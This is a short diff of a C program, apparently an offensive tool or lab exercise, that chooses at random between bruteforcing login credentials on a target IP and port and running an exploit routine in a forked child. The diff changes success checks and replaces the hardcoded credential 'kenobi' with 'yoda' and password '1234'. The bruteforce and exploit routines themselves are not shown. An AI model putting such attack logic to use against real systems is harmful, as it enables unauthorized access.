@@ -81,21 +81,22 @@ void main(int argc, char *argv[]){
     
     if(random % 2){
         success = bruteforce(lenKey, paramIPPort[0], username, pass);
-        if(success == 0){
+        if(success == EXIT_FAILURE){
             child = vfork();
             if(child == -1){
                 perror("");
             }else if(child == 0){
                 success = exploitMain(4, entryExploit);
                 _exit(23);
-            }
+            }         
+            strcpy(username, "yoda");
+            strcpy(pass, "1234");
+
             if(success == EXIT_FAILURE){
                 printf("Não foi possivel obter acesso.\n");
                 exit(0);
             }
-            
-            strcpy(username, "kenobi");
-            strcpy(pass, "1234");
+
         }
     }else{
         child = vfork();
@@ -106,12 +107,12 @@ void main(int argc, char *argv[]){
             _exit(23);
         }
 
-        strcpy(username, "kenobi");
+        strcpy(username, "yoda");
         strcpy(pass, "1234");
         
         if(success == EXIT_FAILURE){
             success = bruteforce(lenKey, paramIPPort[0], username, pass);
-            if(success == 0){
+            if(success == EXIT_FAILURE){
                 printf("Não foi possivel obter acesso.\n");
                 exit(0);
             }
